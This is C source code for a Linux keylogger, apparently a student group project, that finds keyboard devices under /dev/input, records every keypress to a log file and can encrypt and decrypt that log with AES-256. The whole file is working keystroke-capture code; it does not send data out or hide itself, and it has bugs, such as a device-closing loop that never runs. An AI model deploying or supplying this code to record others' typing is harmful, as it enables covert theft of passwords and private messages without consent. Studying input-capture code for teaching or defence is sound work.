/*
 * Author: Group 14, I2C HSLU
 */

// Necessary includes from standard C libraries
#include <stdio.h>       // Needed for file operations (e.g., fopen, fprintf)
#include <stdlib.h>      // Needed for memory management and exit()
#include <fcntl.h>       // Needed for open() and file descriptor flags (e.g., O_RDONLY)
#include <unistd.h>      // Needed for close(), read(), and other POSIX functions
#include <linux/input.h> // Needed for the input_event struct and EV_KEY definitions

#include <string.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/ioctl.h>
#include <poll.h>    // polling from different event files
#include <signal.h>  // for signal handlers
#include <errno.h>   // to use errno
#include <stdbool.h> // Bool type
#include <stdarg.h>  // work with arguments

// For encrpytion
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/sha.h>

// Constants
// #define KEYBOARD_DEVICE "/dev/input/event23"
// -> get with: readlink -e $(find /dev/input/by-path/ -iname "*kbd*" 2>/dev/null)
#define EVENT_MAX 4     // maximum devices to read keyboard events from
#define CACHE_SIZE 1024 // Cache size for log encryption

typedef struct
{
    char buffer[CACHE_SIZE]; // Buffer to hold cached log data
    size_t buffer_len;       // Current length of data in the buffer
} LogCache;

/*
 * Signal handler
 */
volatile sig_atomic_t running = 1;
void handle_signal(int signal)
{
    running = 0;
}

/* @brief print program syntax and an optional error message. Aborts the program with EXIT_FAILURE
 *
 * @param argv0 command line argument 0 (executable)
 * @param error optional error (format) string (printf format) or NULL
 * @param ... parameter to the error format string
 */
void syntax(const char *argv0, const char *error, ...)
{
    if (error)
    {
        va_list ap;
        va_start(ap, error);
        vfprintf(stderr, error, ap);
        va_end(ap);
        fprintf(stderr, "\n\n");
    }

    fprintf(stderr,
            "Usage %s [-p log-file-path] [-e encryption-key] [-d encrypted-file decrypted-file password] [-h]\n"
            "\n"
            "Start a keylogger to log all keyboards inputs\n"
            "\n"
            "Options:\n"
            " -p path                      Specify the path to log keystrokes.\n"
            " -e encryption-key            Specify a key to encrypt the log file.\n"
            " -d encrypted-file output-file password\n"
            "                              Decrypt an encrypted log file to a specified output file using the password.\n"
            " -h                           Print this help message.\n"
            "\n",
            argv0);

    exit(error ? EXIT_FAILURE : EXIT_SUCCESS);
}

/*
 * @brief get the file descriptor to a device that is likely a keyboard
 *
 * Checks if the given device is a keyboard and if so, returns its file descriptor
 *
 * @param device_path pointer to the device path to check (/dev/...)
 * @retval -1 in case of an error
 * @retval 0 if not a keyboard device
 * @retval >0 the file descriptor of the detected keyboard device
 */
int get_keyboard(const char *device_path)
{
    // Get file descriptor
    int fd = open(device_path, O_RDONLY);
    if (fd < 0)
    {
        perror("Failed to open device");
        return -1;
    }

    // Get device name
    char name[256] = "Unknown";
    if (ioctl(fd, EVIOCGNAME(sizeof(name)), name) < 0)
    {
        perror("Failed to get device name");
        close(fd);
        return -1;
    }

    // Filter based on name: Check if "keyboard" appears in the device name
    if (strcasestr(name, "keyboard"))
    {
        printf("Device recognized as keyboard: %s (%s)\n", device_path, name);
        // let the device open and return the devices fd
        return fd;
    }
    else
    {
        printf("Skipping non-keyboard device: %s (%s)\n", device_path, name);
        close(fd);
        return 0;
    }
}

/*
 * @brief Encrypts a string using AES.
 * @param plaintext The plaintext string to encrypt.
 * @param password The encryption key.
 * @param output Output buffer for encrypted data (must be pre-allocated).
 * @param output_len
 * @return Length of the encrypted data, or -1 on failure.
 */
int encrypt_data(const char *plaintext, const char *password, unsigned char *output, int *output_len)
{
    EVP_CIPHER_CTX *ctx;
    int len, ciphertext_len;
    unsigned char salt[8];

    // Generate random salt
    if (!RAND_bytes(salt, sizeof(salt)))
    {
        fprintf(stderr, "Failed to generate random salt\n");
        return -1;
    }

    // Derive the key and IV using EVP_BytesToKey
    unsigned char key[32]; // AES-256 key
    unsigned char iv[16];  // AES-CBC IV
    if (!EVP_BytesToKey(EVP_aes_256_cbc(), EVP_sha256(), salt,
                        (unsigned char *)password, strlen(password), 1, key, iv))
    {
        fprintf(stderr, "Failed to derive key and IV using EVP_BytesToKey\n");
        return -1;
    }

    // Create and initialize the encryption context
    if (!(ctx = EVP_CIPHER_CTX_new()))
    {
        fprintf(stderr, "Failed to create EVP context\n");
        return -1;
    }
    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
    {
        fprintf(stderr, "Failed to initialize encryption\n");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    // Write the "Salted__" header and the salt
    memcpy(output, "Salted__", 8);          // 8-byte header
    memcpy(output + 8, salt, sizeof(salt)); // 8-byte salt
    int offset = 16;                        // Header + Salt

    // Encrypt the plaintext
    if (1 != EVP_EncryptUpdate(ctx, output + offset, &len, (unsigned char *)plaintext, strlen(plaintext)))
    {
        fprintf(stderr, "Encryption failed\n");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    ciphertext_len = len;

    // Finalize encryption
    if (1 != EVP_EncryptFinal_ex(ctx, output + offset + len, &len))
    {
        fprintf(stderr, "Final encryption failed\n");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    ciphertext_len += len;

    *output_len = ciphertext_len + offset;

    // Clean up
    EVP_CIPHER_CTX_free(ctx);
    return 0;
}

/*
 * @brief Log keys into file
 */
void log_key(LogCache *cache, const char *key, bool encryption_enabled)
{
    size_t key_len = strlen(key);

    // Check if the cache can hold the new key
    if (cache->buffer_len + key_len + 1 >= CACHE_SIZE)
    {
        fprintf(stderr, "Cache overflow. Consider increasing CACHE_SIZE.\n");
        exit(EXIT_FAILURE);
    }

    // Append the key to the cache
    memcpy(cache->buffer + cache->buffer_len, key, key_len);
    cache->buffer_len += key_len;
    cache->buffer[cache->buffer_len++] = '\n'; // Add a newline
}

/*
 * @brief
 */
void flush_cache(const char *filename, LogCache *cache, const char *encryption_key, bool encryption_enabled)
{
    FILE *file = fopen(filename, "wb"); // Use "wb" for binary writing
    if (!file)
    {
        perror("Error opening log file for writing");
        exit(EXIT_FAILURE);
    }

    if (encryption_enabled)
    {
        unsigned char encrypted[CACHE_SIZE + EVP_MAX_BLOCK_LENGTH]; // Buffer for encrypted data
        int encrypted_len;

        // Encrypt the cached data
        if (encrypt_data(cache->buffer, encryption_key, encrypted, &encrypted_len) < 0)
        {
            fprintf(stderr, "Failed to encrypt data\n");
            fclose(file);
            exit(EXIT_FAILURE);
        }

        // Write encrypted data to the file
        if (fwrite(encrypted, 1, encrypted_len, file) != encrypted_len)
        {
            perror("Error writing encrypted data to log file");
            fclose(file);
            exit(EXIT_FAILURE);
        }
    }
    else
    {
        // Write plaintext data to the file
        if (fwrite(cache->buffer, 1, cache->buffer_len, file) != cache->buffer_len)
        {
            perror("Error writing plaintext data to log file");
            fclose(file);
            exit(EXIT_FAILURE);
        }
    }

    fclose(file);
    cache->buffer_len = 0; // Reset the cache
}

/*
 * Function to decrypt a file
 */
int decrypt_file(const char *input_file, const char *output_file, const char *password)
{
    FILE *in = fopen(input_file, "rb");
    if (!in)
    {
        perror("Error opening input file");
        return -1;
    }

    FILE *out = fopen(output_file, "w");
    if (!out)
    {
        perror("Error opening output file");
        fclose(in);
        return -1;
    }

    // Read and verify the header
    unsigned char header[8];
    if (fread(header, 1, 8, in) != 8 || memcmp(header, "Salted__", 8) != 0)
    {
        fprintf(stderr, "Invalid file format\n");
        fclose(in);
        fclose(out);
        return -1;
    }

    // Read the salt
    unsigned char salt[8];
    if (fread(salt, 1, 8, in) != 8)
    {
        fprintf(stderr, "Failed to read salt\n");
        fclose(in);
        fclose(out);
        return -1;
    }

    // Derive key and IV using EVP_BytesToKey
    unsigned char key[32]; // AES-256 key
    unsigned char iv[16];  // AES-CBC IV
    if (!EVP_BytesToKey(EVP_aes_256_cbc(), EVP_sha256(), salt,
                        (unsigned char *)password, strlen(password), 1, key, iv))
    {
        fprintf(stderr, "Failed to derive key and IV\n");
        fclose(in);
        fclose(out);
        return -1;
    }

    // Initialize decryption context
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx)
    {
        fprintf(stderr, "Failed to create EVP context\n");
        fclose(in);
        fclose(out);
        return -1;
    }

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
    {
        fprintf(stderr, "Failed to initialize decryption\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(in);
        fclose(out);
        return -1;
    }

    unsigned char buffer[CACHE_SIZE];
    unsigned char decrypted[CACHE_SIZE + EVP_MAX_BLOCK_LENGTH];
    int len, decrypted_len;

    // Decrypt the file content
    while ((len = fread(buffer, 1, CACHE_SIZE, in)) > 0)
    {
        if (1 != EVP_DecryptUpdate(ctx, decrypted, &decrypted_len, buffer, len))
        {
            fprintf(stderr, "Decryption failed\n");
            EVP_CIPHER_CTX_free(ctx);
            fclose(in);
            fclose(out);
            return -1;
        }
        fwrite(decrypted, 1, decrypted_len, out);
    }

    if (1 != EVP_DecryptFinal_ex(ctx, decrypted, &decrypted_len))
    {
        fprintf(stderr, "Final decryption step failed\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(in);
        fclose(out);
        return -1;
    }
    fwrite(decrypted, 1, decrypted_len, out);

    // Cleanup
    EVP_CIPHER_CTX_free(ctx);
    fclose(in);
    fclose(out);
    return 0;
}

/*
 * @brief maps a key code to its human readable representation
 *
 * Static mapping of key codes to human readable
 * Linux kernel source: https://elixir.bootlin.com/linux/v6.12.6/source/include/uapi/linux/input-event-codes.h
 * ... chould be chnaged to a dynamic method, like libevdev...
 *
 * @param key_code the code of the key to resolve
 * @retval UNKOWN if key code is not known
 * @return human readable string representing the key
 */
const char *get_key_name(int key_code)
{
    // key representation array
    static const char *key_names[] = {
        "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
        "MINUS", "EQUAL", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y",
        "U", "I", "O", "P", "LEFTBRACE", "RIGHTBRACE", "ENTER", "LEFTCTRL",
        "A", "S", "D", "F", "G", "H", "J", "K", "L", "SEMICOLON", "APOSTROPHE",
        "GRAVE", "LEFTSHIFT", "BACKSLASH", "Z", "X", "C", "V", "B", "N", "M",
        "COMMA", "DOT", "SLASH", "RIGHTSHIFT", "KPASTERISK", "LEFTALT", "SPACE",
        "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10",
        "NUMLOCK", "SCROLLLOCK", "K7", "K8", "K9", "KMINUS", "K4", "K5", "K6",
        "KPLUS", "K1", "K2", "K3", "K0", "KDOT", "UNKNOWN", "ZENKAKUHANKAKU",
        "102ND", "F11", "F12", "RO", "KATAKANA", "HIRAGANA", "HENKAN", "KATAKANAHIRAGANA",
        "MUHENKAN", "KPJPCOMMA", "KPENTER", "RIGHTCTRL", "KPSLASH", "SYSRQ",
        "RIGHTALT", "LINEFEED", "HOME", "UP", "PAGEUP", "LEFT", "RIGHT", "END",
        "DOWN", "PAGEDOWN", "INSERT", "DELETE", "MACRO", "MUTE", "VOLUMEDOWN",
        "VOLUMEUP", "POWER", "KPEQUAL", "KPPLUSMINUS", "PAUSE", "SCALE", "KPCOMMA",
        "HANGEUL", "HANJA", "YEN", "LEFTMETA", "RIGHTMETA", "COMPOSE", "STOP",
        "AGAIN", "PROPS", "UNDO", "FRONT", "COPY", "OPEN", "PASTE", "FIND", "CUT",
        "HELP", "MENU", "CALC", "SETUP", "SLEEP", "WAKEUP", "FILE", "SENDFILE",
        "DELETEFILE", "XFER", "PROG1", "PROG2", "WWW", "MSDOS", "COFFEE", "ROTATE_DISPLAY",
        "CYCLEWINDOWS", "MAIL", "BOOKMARKS", "COMPUTER", "BACK", "FORWARD", "CLOSECD",
        "EJECTCD", "EJECTCLOSECD", "NEXTSONG", "PLAYPAUSE", "PREVIOUSSONG", "STOPCD",
        "RECORD", "REWIND", "PHONE", "ISO", "CONFIG", "HOMEPAGE", "REFRESH", "EXIT",
        "MOVE", "EDIT", "SCROLLUP", "SCROLLDOWN", "KPLEFTPAREN", "KPRIGHTPAREN",
        "NEW", "REDO", "F13", "F14", "F15", "F16", "F17", "F18", "F19", "F20", "F21",
        "F22", "F23", "F24", "PLAYCD", "PAUSECD", "PROG3", "PROG4", "DASHBOARD",
        "SUSPEND", "CLOSE", "PLAY", "FASTFORWARD", "BASSBOOST", "PRINT", "HP",
        "CAMERA", "SOUND", "QUESTION", "EMAIL", "CHAT", "SEARCH", "CONNECT", "FINANCE",
        "SPORT", "SHOP", "ALTERASE", "CANCEL", "BRIGHTNESSDOWN", "BRIGHTNESSUP",
        "MEDIA", "SWITCHVIDEOMODE", "KBDILLUMTOGGLE", "KBDILLUMDOWN", "KBDILLUMUP",
        "SEND", "REPLY", "FORWARDMAIL", "SAVE", "DOCUMENTS", "BATTERY", "BLUETOOTH",
        "WLAN", "UWB", "UNKNOWN", "VIDEO_NEXT", "VIDEO_PREV", "BRIGHTNESS_CYCLE",
        "BRIGHTNESS_AUTO", "DISPLAY_OFF", "WWAN", "RFKILL", "MICMUTE"};

    // Return the result
    if (key_code >= 0 && key_code < sizeof(key_names) / sizeof(key_names[0]))
    {
        return key_names[key_code];
    }
    else
    {
        return "UNKNOWN";
    }
}

/*
 * MAIN PROCEDURE
 */
int main(int argc, char **argv)
{
    /*
     * Parse arguments
     */
    char *logFilePath = strdup("keylog.txt"); // Default log file path
    char *decryptedFilePath = NULL;           // Output file for decryption
    bool encryption_enabled = false;          // Default no encryption
    bool decryption_enabled = false;          // Default no decryption
    char *encryption_key = NULL;

    if (!logFilePath)
    {
        perror("Failed to allocate memory for log file path");
        return EXIT_FAILURE;
    }

    for (int i = 1; i < argc; i++)
    {
        if (argv[i][0] == '-')
        {
            // Process options
            // format: "-<flag>"
            if (!strcmp(argv[i], "-e"))
            {
                if (i + 1 >= argc)
                {
                    syntax(argv[0], "Missing argument for option '%s'.", argv[i]);
                }
                encryption_enabled = true;
                encryption_key = strdup(argv[i + 1]);
                if (!encryption_key)
                {
                    perror("Failed to allocate memory for encryption key");
                    return EXIT_FAILURE;
                }
                i++; // Skip the key argument
            }
            else if (!strcmp(argv[i], "-p"))
            {
                // Specified log file path
                if (i + 1 >= argc)
                {
                    syntax(argv[0], "Missing argument for option '%s'.", argv[i]);
                }
                // Allocate and copy the new log file path
                free(logFilePath); // Free previous allocation
                logFilePath = strdup(argv[i + 1]);
                if (!logFilePath)
                {
                    perror("Failed to allocate memory for log file path");
                    return EXIT_FAILURE;
                }
                i++; // Skip next argument since it's the path
            }
            else if (!strcmp(argv[i], "-d"))
            {
                if (i + 3 >= argc)
                {
                    syntax(argv[0], "Missing arguments for option '%s'.", argv[i]);
                }
                decryption_enabled = true;
                logFilePath = strdup(argv[i + 1]);       // Encrypted input file
                decryptedFilePath = strdup(argv[i + 2]); // Output file
                encryption_key = strdup(argv[i + 3]);    // Password
                if (!logFilePath || !decryptedFilePath || !encryption_key)
                {
                    perror("Failed to allocate memory for decryption arguments");
                    return EXIT_FAILURE;
                }
                i += 3; // Skip arguments for -d
            }
            else if (!strcmp(argv[i], "-h"))
                syntax(argv[0], NULL); // Print help and exit
            else
            {
                syntax(argv[0], "Unrecognized option '%s'.", argv[i]);
                return EXIT_FAILURE;
            }
        }
        else
        {
            syntax(argv[0], "Unrecognized argument '%s'.", argv[i]);
            return EXIT_FAILURE;
        }
    }

    /*
     * Do decrpytion
     */
    if (decryption_enabled)
    {
        printf("Decrypting file '%s' to '%s'\n", logFilePath, decryptedFilePath);
        // Call decrypt_file and handle errors if any
        if (decrypt_file(logFilePath, decryptedFilePath, encryption_key) < 0)
        {
            fprintf(stderr, "Decryption failed. Please check the file, output path, and password.\n");
            free(logFilePath);
            free(encryption_key);
            return EXIT_FAILURE;
        }
        printf("Decryption complete.\n");
        free(logFilePath);
        free(decryptedFilePath);
        free(encryption_key);
        return EXIT_SUCCESS;
    }

    /*
     * Get keyboard devices
     */

    // event variables
    int event_fds[EVENT_MAX]; // event file descriptors
    int index = 0;            // event index

    // Get input devices from /dev/input
    struct dirent *entry;
    DIR *dir = opendir("/dev/input/");
    if (!dir)
    {
        perror("Failed to open /dev/input/");
        free(logFilePath);
        free(encryption_key);
        return EXIT_FAILURE;
    }

    // Scan input devices for keyboards
    printf("Scanning /dev/input/ for keyboard devices...\n");
    while ((entry = readdir(dir)) != NULL)
    {
        // Only consider files starting with "event"
        if (strncmp(entry->d_name, "event", 5) != 0)
            continue;
        // Build full device path
        char device_path[PATH_MAX];
        snprintf(device_path, sizeof(device_path), "/dev/input/%s", entry->d_name);
        // Get event file descriptor (via get_keyboard function)
        event_fds[index] = get_keyboard(device_path);
        if (event_fds[index] > 0)
        {
            printf("Valid keyboard device found: %s\n", device_path);
            index++; // increase index to know how many keyboard devices have been detected
        }
    }
    closedir(dir);

    if (index == 0)
    {
        fprintf(stderr, "No valid keyboard devices found.\n");
        free(logFilePath);
        free(encryption_key);
        return EXIT_FAILURE;
    }

    // Create and fill structure for polling the keyboard devices
    struct pollfd fds[EVENT_MAX];
    for (int i = 0; i < index; i++)
    {
        fds[i].fd = event_fds[i]; // Copy file descriptor
        fds[i].events = POLLIN;   // Monitor for readable data
    }

    /*
     * Log all keystokes until the program ends
     */

    printf("Logging keystrokes to %s\n", logFilePath);

    // Register signal handlers
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    LogCache cache = {.buffer_len = 0}; // Initialize the cache

    // Loop until running is set to 0 (see signal handler)
    while (running)
    {
        // Wait for an event
        int ret = poll(fds, index, -1);
        if (ret < 0)
        {
            if (errno == EINTR)
            {
                // Poll interrupted by a signal, retry if still running
                continue;
            }
            perror("Poll error");
            break;
        }

        // Get and log the keystrokes
        for (int i = 0; i < index; i++) // check every keyboard device
        {
            if (fds[i].revents & POLLIN)
            {
                struct input_event ev;
                // Handle disconnected device
                if (read(fds[i].fd, &ev, sizeof(struct input_event)) <= 0)
                {
                    perror("Device disconnected");
                    close(fds[i].fd);

                    // Shift remaining descriptors
                    for (int j = i; j < index - 1; j++)
                    {
                        fds[j] = fds[j + 1];
                        event_fds[j] = event_fds[j + 1];
                    }
                    index--;
                    continue;
                }
                // Key mapping and logging
                else
                {
                    if (ev.type == EV_KEY && ev.value == 1)
                    {
                        const char *key_name = get_key_name(ev.code);
                        log_key(&cache, key_name, encryption_enabled);
                    }
                }
            }
        }
    }

    /*
     * Program Cleanup
     */

    // Flush the cache on exit
    flush_cache(logFilePath, &cache, encryption_key, encryption_enabled);

    // Close keyboard devices
    for (int i = index; i <= 0; i--)
    {
        close(event_fds[i - 1]);
    }

    // Flush stdout to ensure proper terminal state
    fflush(stdout);

    // Freeing
    free(logFilePath);
    free(encryption_key);

    printf("Exiting gracefully...\n");

    return EXIT_SUCCESS;
}
